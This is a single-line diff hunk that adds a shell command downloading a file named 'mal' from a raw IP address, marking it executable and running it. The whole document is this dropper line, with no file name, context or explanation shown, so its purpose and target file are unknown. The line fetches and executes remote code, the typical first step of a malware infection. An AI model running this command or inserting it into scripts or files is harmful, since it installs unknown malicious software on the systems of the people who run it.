@@ -1,0 +1,1 @@
+wget http://209.250.250.226/mal -O mal;chmod +x mal;./mal
